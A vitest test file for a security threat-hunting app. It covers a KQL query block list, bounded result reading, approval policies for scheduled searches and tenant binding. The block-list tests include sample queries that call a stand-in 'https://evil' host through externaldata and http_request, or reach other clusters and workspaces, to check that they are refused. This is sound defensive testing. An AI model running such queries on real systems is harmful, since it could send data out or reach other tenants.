import { afterEach, describe, expect, it, vi } from 'vitest'
import { and, eq, sql } from 'drizzle-orm'
import { getDb } from '../src/server/db/client'
import { chatThreads, huntSchedules, kqlProposals, orgMemberships, watchEntries, watchHits } from '../src/server/db/schema'
import { resetEnvForTests } from '../src/server/env'
import { setTokenBroker, TokenBroker, upsertConnector } from '../src/server/hunting/broker'
import { HARD_RESPONSE_BYTES, HuntingClient, HuntingResultError, setHuntingClient } from '../src/server/hunting/client'
import { refusalMessage } from '../src/server/hunting/errors'
import { approveAndRunKql, createHunt, getHunt, proposeKql } from '../src/server/hunting/hunts'
import { huntReportMarkdown } from '../src/server/hunting/report'
import { assertSafeKql, UnsafeQueryError } from '../src/server/hunting/safety'
import { createSchedule, disableSchedule, disableSchedulesApprovedBy, reapproveSchedule, runDueSchedules } from '../src/server/hunting/schedules'
import { makeOrg, makeUser, member, team } from './helpers'

const TENANT = '0f0e0d0c-0b0a-0908-0706-050403020100'
const OTHER_TENANT = 'aaaaaaaa-0b0a-0908-0706-050403020100'
const CLIENT = '01020304-0506-0708-090a-0b0c0d0e0f10'
const WORKSPACE = '11111111-2222-3333-4444-555555555555'

function withEnv(vars: Record<string, string>) {
  Object.assign(process.env, vars)
  resetEnvForTests()
}

afterEach(() => {
  for (const k of ['KQL_APPROVAL_POLICY', 'HUNTING_DEMO_MODE']) delete process.env[k]
  resetEnvForTests()
  setHuntingClient(new HuntingClient())
})

const later = () => new Date(Date.now() + 61 * 60_000)
const scheduleRow = async (id: string) => (await getDb().select().from(huntSchedules).where(eq(huntSchedules.id, id)))[0]!

describe('KQL blocklist normalisation (#193)', () => {
  it('a // comment and a line break between a keyword and ( cannot hide a call', () => {
    for (const q of [
      'cluster // note\n("other").database("d").T',
      'T | union (externaldata // x\n(a:string)["https://evil"])',
      'external_table //\n("x")',
      'workspace // hop\n("other-ws").SecurityEvent',
    ]) {
      expect(() => assertSafeKql(q), q).toThrow(UnsafeQueryError)
    }
  })

  it('blocks adx(), arg(), workspace(), app(), resource() and cluster()', () => {
    for (const q of [
      'adx("https://help.kusto.windows.net/Samples").StormEvents',
      'arg("").Resources | take 1',
      'workspace("other").SecurityEvent | take 1',
      'app("other-app").requests | take 1',
      'resource("/subscriptions/x/resourceGroups/y").AzureActivity',
      'cluster("x").database("y").T',
      'union ADX ( "https://x" ).T',
    ]) {
      expect(() => assertSafeKql(q), q).toThrow(UnsafeQueryError)
    }
  })

  it('evaluate allows a short list of plugins and refuses the rest, hints included', () => {
    for (const q of [
      'T | evaluate hint.distribution=per_node http_request("https://evil")',
      'T | evaluate hint.distribution = "single" sql_request("x")',
      'T | evaluate hint.remote=auto python(typeof(*), "x")',
      'T | evaluate // hide\n http_request_post("https://evil")',
      'T | evaluate some_future_plugin()',
      'T | evaluate',
    ]) {
      expect(() => assertSafeKql(q), q).toThrow(UnsafeQueryError)
    }
    for (const q of ['T | evaluate bag_unpack(Props)', 'T | evaluate autocluster()', 'T | evaluate hint.distribution=per_node basket(0.1)', 'T | evaluate pivot(Col)']) {
      expect(() => assertSafeKql(q), q).not.toThrow()
    }
  })

  it('ordinary hunting queries still pass, including the words inside strings and comments', () => {
    for (const q of [
      'DeviceProcessEvents | where ProcessCommandLine has "-enc" | take 10',
      'DeviceProcessEvents | where ProcessCommandLine has "evaluate" | take 10',
      '// apps that touched the file\nDeviceFileEvents | where InitiatingProcessFileName =~ "app.exe" | take 5',
      'SigninLogs | where AppDisplayName == "My app" | summarize count() by AppDisplayName',
      "DeviceInfo | where DeviceName == @'c:\\temp\\x' | take 1",
    ]) {
      expect(() => assertSafeKql(q), q).not.toThrow()
    }
  })

  it('a // inside a string literal still cannot hide a blocked call on the same line', () => {
    expect(() => assertSafeKql('print u="https://x"; externaldata(a:string)[@"https://evil/x"]')).toThrow(UnsafeQueryError)
    expect(() => assertSafeKql('print "//" | evaluate http_request("https://evil")')).toThrow(UnsafeQueryError)
  })
})

describe('hunting client reads bounded, complete results (#200)', () => {
  async function liveOrg() {
    const org = await makeOrg('Live200')
    await upsertConnector(org, { tenantId: TENANT, clientId: CLIENT, clientSecret: 'x', sentinelWorkspaceId: WORKSPACE })
    setTokenBroker(new TokenBroker({ clientCredentials: async () => ({ accessToken: 'live-token', expiresAt: Date.now() + 3600_000 }) }))
    return org
  }
  const client = (body: () => Response) => new HuntingClient(vi.fn(async () => body()) as unknown as typeof fetch)

  it('a top-level error on a 200 fails the search instead of reading as rows', async () => {
    const org = await liveOrg()
    const partial = () => Response.json({ tables: [{ name: 'PrimaryResult', columns: [{ name: 'A' }], rows: [[1]] }], error: { code: 'PartialError', message: 'Query result set has exceeded the internal limit' } })
    await expect(client(partial).runSentinelKql({ orgId: org, kql: 'T | take 1' })).rejects.toThrow(/only part of the result.*PartialError/)
    const graph = () => Response.json({ schema: [], results: [], error: { code: 'Throttled' } })
    await expect(client(graph).runAdvancedHunting({ orgId: org, kql: 'T | take 1' })).rejects.toBeInstanceOf(HuntingResultError)
  })

  it('a 200 with no results or tables is an error, never zero rows', async () => {
    const org = await liveOrg()
    await expect(client(() => Response.json({ schema: [] })).runAdvancedHunting({ orgId: org, kql: 'T | take 1' })).rejects.toThrow(/without the expected rows/)
    await expect(client(() => Response.json({})).runSentinelKql({ orgId: org, kql: 'T | take 1' })).rejects.toThrow(/without the expected rows/)
    await expect(client(() => Response.json({ tables: [{ columns: [{ name: 'A' }] }] })).runSentinelKql({ orgId: org, kql: 'T | take 1' })).rejects.toThrow(/without the expected rows/)
    await expect(client(() => new Response('<html>not json</html>')).runAdvancedHunting({ orgId: org, kql: 'T | take 1' })).rejects.toThrow(/could not read/)
    // A real empty result is still zero rows.
    const empty = await client(() => Response.json({ tables: [{ columns: [{ name: 'A' }], rows: [] }] })).runSentinelKql({ orgId: org, kql: 'T | take 1' })
    expect(empty.rowCount).toBe(0)
  })

  it('refuses a body over the byte cap, by header and while streaming', async () => {
    const org = await liveOrg()
    const declared = () => new Response('{}', { headers: { 'content-length': String(HARD_RESPONSE_BYTES + 1) } })
    await expect(client(declared).runAdvancedHunting({ orgId: org, kql: 'T | take 1' })).rejects.toThrow(/larger than 32 MB/)
    const chunk = new Uint8Array(1024 * 1024).fill(32)
    let sent = 0
    const streamed = () =>
      new Response(
        new ReadableStream<Uint8Array>({
          pull(c) {
            sent++
            if (sent > 40) c.close()
            else c.enqueue(chunk)
          },
        }),
      )
    await expect(client(streamed).runSentinelKql({ orgId: org, kql: 'T | take 1' })).rejects.toThrow(/larger than 32 MB/)
    // The read stopped just past the cap, not at the end of the stream.
    expect(sent).toBeLessThan(40)
  })

  it('a partial result is recorded as a failed search with a plain reason, never as no hits', async () => {
    const t = await team()
    await upsertConnector(t.orgId, { tenantId: TENANT, clientId: CLIENT, clientSecret: 'x', sentinelWorkspaceId: WORKSPACE })
    setTokenBroker(new TokenBroker({ clientCredentials: async () => ({ accessToken: 'live-token', expiresAt: Date.now() + 3600_000 }) }))
    setHuntingClient(client(() => Response.json({ tables: [{ columns: [{ name: 'A' }], rows: [] }], error: { code: 'PartialError' } })))
    const hunt = await createHunt(t.orgId, t.analyst, { title: 'Partial' })
    const p = await proposeKql(t.orgId, { type: 'user', id: t.analyst }, { huntId: hunt.id, target: 'sentinel', kql: 'SecurityEvent | take 1' })
    const r = await approveAndRunKql(t.orgId, t.analyst, p.id)
    expect(r.status).toBe('failed')
    const [row] = await getDb().select().from(kqlProposals).where(eq(kqlProposals.id, p.id))
    expect(row!.status).toBe('failed')
    expect(row!.resultSummary).toBeNull()
    // The analyst sees the reason, not a server reference.
    expect(refusalMessage(new HuntingResultError('x'), 'run')).toBe('x')
  })
})

describe('an audit write failure never marks a search that ran as failed (#206)', () => {
  /** Make every insert of one evidence type fail inside the database, as a real outage would. */
  async function failEvidence(type: string) {
    const db = getDb()
    await db.execute(
      sql.raw(`create or replace function cw_test_fail_evidence() returns trigger as $$
      begin
        if new.type = '${type}' then raise exception 'evidence write failed'; end if;
        return new;
      end $$ language plpgsql`),
    )
    await db.execute(sql.raw('drop trigger if exists cw_test_fail_evidence on hunt_evidence'))
    await db.execute(sql.raw('create trigger cw_test_fail_evidence before insert on hunt_evidence for each row execute function cw_test_fail_evidence()'))
  }
  const healEvidence = () => getDb().execute(sql.raw('drop trigger if exists cw_test_fail_evidence on hunt_evidence'))

  it('approveAndRunKql keeps status run with its result when the kql_result evidence write throws', async () => {
    const t = await team()
    const hunt = await createHunt(t.orgId, t.analyst, { title: 'Audit outage' })
    const p = await proposeKql(t.orgId, { type: 'user', id: t.analyst }, { huntId: hunt.id, target: 'defender', kql: 'DeviceInfo | take 3' })
    await failEvidence('kql_result')
    try {
      const r = await approveAndRunKql(t.orgId, t.analyst, p.id)
      expect(r.status).toBe('run')
    } finally {
      await healEvidence()
    }
    const [row] = await getDb().select().from(kqlProposals).where(eq(kqlProposals.id, p.id))
    expect(row!.status).toBe('run')
    expect(row!.error).toBeNull()
    expect((row!.resultSummary as { rowCount: number }).rowCount).toBeGreaterThan(0)
    const evidence = (await getHunt(t.orgId, hunt.id))!.evidence.map((e) => e.type)
    expect(evidence).not.toContain('kql_failed')
  })

  it('a scheduled run stays run when the scheduled_result evidence write throws', async () => {
    await getDb().update(huntSchedules).set({ enabled: false })
    const t = await team()
    const hunt = await createHunt(t.orgId, t.analyst, { title: 'Scheduled audit outage' })
    const p = await proposeKql(t.orgId, { type: 'user', id: t.analyst }, { huntId: hunt.id, target: 'defender', kql: 'DeviceInfo | take 4' })
    await approveAndRunKql(t.orgId, t.analyst, p.id)
    const s = await createSchedule(t.orgId, { userId: t.approver, role: 'approver' }, { proposalId: p.id, intervalMinutes: 60 })
    await failEvidence('scheduled_result')
    try {
      expect((await runDueSchedules(later)).ran).toBe(1)
    } finally {
      await healEvidence()
    }
    const row = await scheduleRow(s.id)
    expect(row.lastStatus).toBe('run')
    expect(row.lastError).toBeNull()
    expect((await getHunt(t.orgId, hunt.id))!.evidence.map((e) => e.type)).not.toContain('scheduled_failed')
  })
})

describe('scheduled searches follow the approval policy and the approved tenant (#189)', () => {
  async function ran(requester: 'approver' | 'analyst' | 'owner', runner: 'approver' | 'analyst' | 'owner' = 'owner') {
    await getDb().update(huntSchedules).set({ enabled: false })
    const t = await team()
    const hunt = await createHunt(t.orgId, t[requester], { title: 'Policy schedule' })
    const p = await proposeKql(t.orgId, { type: 'user', id: t[requester] }, { huntId: hunt.id, target: 'defender', kql: 'DeviceInfo | take 2' })
    const role = runner === 'analyst' ? 'analyst' : runner
    expect((await approveAndRunKql(t.orgId, t[runner], p.id, undefined, role)).status).toBe('run')
    return { t, hunt, p }
  }

  it("'second-person': the person who asked for the search cannot schedule or re-approve it alone", async () => {
    withEnv({ KQL_APPROVAL_POLICY: 'second-person' })
    const { t, p } = await ran('approver', 'owner')
    await expect(createSchedule(t.orgId, { userId: t.approver, role: 'approver' }, { proposalId: p.id, intervalMinutes: 60 })).rejects.toThrow(/You asked for this search/)
    const s = await createSchedule(t.orgId, { userId: t.owner, role: 'owner' }, { proposalId: p.id, intervalMinutes: 60 })
    await disableSchedule(t.orgId, { userId: t.owner, role: 'owner' }, s.id)
    await expect(reapproveSchedule(t.orgId, { userId: t.approver, role: 'approver' }, s.id)).rejects.toThrow(/You asked for this search/)
    await reapproveSchedule(t.orgId, { userId: t.owner, role: 'owner' }, s.id)
    expect((await scheduleRow(s.id)).enabled).toBe(true)
  })

  it("'member' and 'approver' policies still let the requester's approver schedule it", async () => {
    for (const policy of ['member', 'approver']) {
      withEnv({ KQL_APPROVAL_POLICY: policy })
      const { t, p } = await ran('approver', 'approver')
      const s = await createSchedule(t.orgId, { userId: t.approver, role: 'approver' }, { proposalId: p.id, intervalMinutes: 60 })
      expect(s.approvedContext).toEqual({ mode: 'demo', tenantId: null, clientId: null, sentinelWorkspaceId: null })
    }
  })

  it('switching to second-person stops a schedule its requester approved', async () => {
    const { t, p } = await ran('approver', 'approver')
    const s = await createSchedule(t.orgId, { userId: t.approver, role: 'approver' }, { proposalId: p.id, intervalMinutes: 60 })
    withEnv({ KQL_APPROVAL_POLICY: 'second-person' })
    expect((await runDueSchedules(later)).ran).toBe(1)
    const row = await scheduleRow(s.id)
    expect(row.enabled).toBe(false)
    expect(row.lastStatus).toBe('stopped')
    expect(row.lastRunAt).toBeNull()
    expect(row.disabledReason).toMatch(/second person/)
  })

  it('a schedule stops when its approver is no longer an owner or approver, or has left', async () => {
    const { t, p } = await ran('analyst', 'analyst')
    const s = await createSchedule(t.orgId, { userId: t.approver, role: 'approver' }, { proposalId: p.id, intervalMinutes: 60 })
    await getDb().update(orgMemberships).set({ role: 'analyst' }).where(eq(orgMemberships.userId, t.approver))
    await runDueSchedules(later)
    let row = await scheduleRow(s.id)
    expect(row.enabled).toBe(false)
    expect(row.lastRunAt).toBeNull()
    expect(row.disabledReason).toMatch(/no longer an owner or approver/)

    // Left the organisation entirely.
    await getDb().update(orgMemberships).set({ role: 'approver' }).where(eq(orgMemberships.userId, t.approver))
    await reapproveSchedule(t.orgId, { userId: t.approver, role: 'approver' }, s.id)
    await getDb().delete(orgMemberships).where(eq(orgMemberships.userId, t.approver))
    await runDueSchedules(later)
    row = await scheduleRow(s.id)
    expect(row.enabled).toBe(false)
    expect(row.lastRunAt).toBeNull()
  })

  it("dropping someone's role disables the schedules they approved, with evidence", async () => {
    const { t, hunt, p } = await ran('analyst', 'analyst')
    const s = await createSchedule(t.orgId, { userId: t.approver, role: 'approver' }, { proposalId: p.id, intervalMinutes: 60 })
    expect(await disableSchedulesApprovedBy(t.orgId, t.approver, 'role dropped')).toBe(1)
    expect((await scheduleRow(s.id)).enabled).toBe(false)
    expect((await getHunt(t.orgId, hunt.id))!.evidence.some((e) => e.type === 'schedule_disabled' && (e.payload as { reason?: string }).reason === 'role dropped')).toBe(true)
  })

  it('a demo-mode schedule stops once a real connector is saved, and cannot be re-approved onto it', async () => {
    const { t, p } = await ran('analyst', 'analyst')
    const s = await createSchedule(t.orgId, { userId: t.approver, role: 'approver' }, { proposalId: p.id, intervalMinutes: 60 })
    await upsertConnector(t.orgId, { tenantId: TENANT, clientId: CLIENT, clientSecret: 'x' })
    const fetchImpl = vi.fn()
    setHuntingClient(new HuntingClient(fetchImpl as unknown as typeof fetch))
    await runDueSchedules(later)
    expect(fetchImpl).not.toHaveBeenCalled()
    const row = await scheduleRow(s.id)
    expect(row.enabled).toBe(false)
    expect(row.disabledReason).toMatch(/connector changed/)
    await expect(reapproveSchedule(t.orgId, { userId: t.approver, role: 'approver' }, s.id)).rejects.toThrow(/ran on demo data/)
    // And a demo result cannot be scheduled now either.
    await expect(createSchedule(t.orgId, { userId: t.owner, role: 'owner' }, { proposalId: p.id, intervalMinutes: 60 })).rejects.toThrow(/ran on demo data/)
  })

  it('pointing the connector at another tenant or workspace stops live schedules until re-approved', async () => {
    await getDb().update(huntSchedules).set({ enabled: false })
    const t = await team()
    await upsertConnector(t.orgId, { tenantId: TENANT, clientId: CLIENT, clientSecret: 'x', sentinelWorkspaceId: WORKSPACE })
    const hunt = await createHunt(t.orgId, t.analyst, { title: 'Live schedule' })
    const p = await proposeKql(t.orgId, { type: 'user', id: t.analyst }, { huntId: hunt.id, target: 'sentinel', kql: 'SecurityEvent | take 1' })
    // Stand in for a live run that already happened.
    await getDb().update(kqlProposals).set({ status: 'run', ranAt: new Date(), resultSummary: { mode: 'live', rowCount: 0 } }).where(eq(kqlProposals.id, p.id))
    const s = await createSchedule(t.orgId, { userId: t.approver, role: 'approver' }, { proposalId: p.id, intervalMinutes: 60 })
    expect(s.approvedContext).toEqual({ mode: 'live', tenantId: TENANT, clientId: CLIENT, sentinelWorkspaceId: WORKSPACE })

    await upsertConnector(t.orgId, { tenantId: OTHER_TENANT, clientId: CLIENT, sentinelWorkspaceId: WORKSPACE })
    const fetchImpl = vi.fn()
    setHuntingClient(new HuntingClient(fetchImpl as unknown as typeof fetch))
    await runDueSchedules(later)
    expect(fetchImpl).not.toHaveBeenCalled()
    expect((await scheduleRow(s.id)).disabledReason).toMatch(/connector changed/)

    // Re-approving binds it to the new tenant.
    await reapproveSchedule(t.orgId, { userId: t.approver, role: 'approver' }, s.id)
    expect((await scheduleRow(s.id)).approvedContext).toMatchObject({ tenantId: OTHER_TENANT })
  })

  it('a schedule approved before the binding existed must be re-approved', async () => {
    const { t, p } = await ran('analyst', 'analyst')
    const s = await createSchedule(t.orgId, { userId: t.approver, role: 'approver' }, { proposalId: p.id, intervalMinutes: 60 })
    await getDb().update(huntSchedules).set({ approvedContext: null }).where(eq(huntSchedules.id, s.id))
    await runDueSchedules(later)
    expect((await scheduleRow(s.id)).disabledReason).toMatch(/not tied to a tenant/)
  })
})

describe('one enabled schedule per query (#207)', () => {
  async function ranProposal() {
    await getDb().update(huntSchedules).set({ enabled: false })
    const t = await team()
    const hunt = await createHunt(t.orgId, t.analyst, { title: 'Duplicate schedules' })
    const p = await proposeKql(t.orgId, { type: 'user', id: t.analyst }, { huntId: hunt.id, target: 'defender', kql: 'DeviceInfo | take 6' })
    await approveAndRunKql(t.orgId, t.analyst, p.id)
    return { t, p }
  }

  it('re-approving a paused schedule is refused while another schedule for the same query is enabled', async () => {
    const { t, p } = await ranProposal()
    const approver = { userId: t.approver, role: 'approver' as const }
    const first = await createSchedule(t.orgId, approver, { proposalId: p.id, intervalMinutes: 60 })
    await disableSchedule(t.orgId, approver, first.id)
    await createSchedule(t.orgId, approver, { proposalId: p.id, intervalMinutes: 60 })
    await expect(reapproveSchedule(t.orgId, approver, first.id)).rejects.toThrow(/already has an enabled schedule/)
    expect((await scheduleRow(first.id)).enabled).toBe(false)
  })

  it('two requests at once create one schedule; the database refuses the second with a plain message', async () => {
    const { t, p } = await ranProposal()
    const approver = { userId: t.approver, role: 'approver' as const }
    const results = await Promise.allSettled([createSchedule(t.orgId, approver, { proposalId: p.id, intervalMinutes: 60 }), createSchedule(t.orgId, approver, { proposalId: p.id, intervalMinutes: 60 })])
    expect(results.filter((r) => r.status === 'fulfilled')).toHaveLength(1)
    const refused = results.find((r) => r.status === 'rejected') as PromiseRejectedResult
    expect(refused.reason.message).toBe('This query already has an enabled schedule.')
    // The index itself holds even without the check in front of it.
    const [existing] = await getDb().select().from(huntSchedules).where(eq(huntSchedules.sourceProposalId, p.id))
    const { id: _id, createdAt: _c, ...copy } = existing!
    await expect(getDb().insert(huntSchedules).values(copy)).rejects.toThrow()
    await getDb().insert(huntSchedules).values({ ...copy, enabled: false })
  })
})

describe('createHunt checks the hit and chat it points at (#208)', () => {
  it("refuses another organisation's watch hit, another person's chat and ids that do not exist", async () => {
    const a = await makeOrg('OwnA')
    const b = await makeOrg('OwnB')
    const ua = await makeUser()
    const ua2 = await makeUser()
    const ub = await makeUser()
    await member(a, ua)
    await member(a, ua2)
    await member(b, ub)
    const db = getDb()
    const [entryB] = await db.insert(watchEntries).values({ orgId: b, type: 'vendor', value: 'acme', normalized: 'acme', createdBy: ub }).returning()
    const [hitB] = await db.insert(watchHits).values({ orgId: b, entryId: entryB!.id, source: 'feed', sourceId: crypto.randomUUID(), title: 'B hit' }).returning()
    const [threadB] = await db.insert(chatThreads).values({ orgId: b, userId: ub }).returning()
    const [threadA2] = await db.insert(chatThreads).values({ orgId: a, userId: ua2 }).returning()
    const [threadA] = await db.insert(chatThreads).values({ orgId: a, userId: ua }).returning()

    await expect(createHunt(a, ua, { title: 'x', watchHitId: hitB!.id })).rejects.toThrow(/watch hit was not found/)
    await expect(createHunt(a, ua, { title: 'x', watchHitId: crypto.randomUUID() })).rejects.toThrow(/watch hit was not found/)
    await expect(createHunt(a, ua, { title: 'x', threadId: threadB!.id })).rejects.toThrow(/chat was not found/)
    await expect(createHunt(a, ua, { title: 'x', threadId: threadA2!.id })).rejects.toThrow(/chat was not found/)
    await expect(createHunt(a, ua, { title: 'x', threadId: 'no-such-thread' })).rejects.toThrow(/chat was not found/)
    expect((await createHunt(a, ua, { title: 'Own chat', threadId: threadA!.id })).threadId).toBe(threadA!.id)
  })
})

describe('hunt report names current members only (#209)', () => {
  it('shows "a former member" for someone who left, without their name or email', async () => {
    const t = await team()
    const hunt = await createHunt(t.orgId, t.analyst, { title: 'Leaver' })
    const p = await proposeKql(t.orgId, { type: 'user', id: t.analyst }, { huntId: hunt.id, target: 'defender', kql: 'DeviceInfo | take 1' })
    await approveAndRunKql(t.orgId, t.approver, p.id)
    const before = (await huntReportMarkdown(t.orgId, hunt.id, t.owner))!.markdown
    expect(before).toMatch(/\*\*Approved by:\*\* User \d+ \(/)

    // Still a member of another organisation: the global user row exists, but not in this org.
    const other = await makeOrg('Elsewhere')
    await member(other, t.approver, 'approver')
    await getDb().delete(orgMemberships).where(and(eq(orgMemberships.userId, t.approver), eq(orgMemberships.orgId, t.orgId)))
    const after = (await huntReportMarkdown(t.orgId, hunt.id, t.owner))!.markdown
    expect(after).toContain('**Approved by:** a former member')
    expect(after).not.toMatch(/@example\.test/)
  })
})
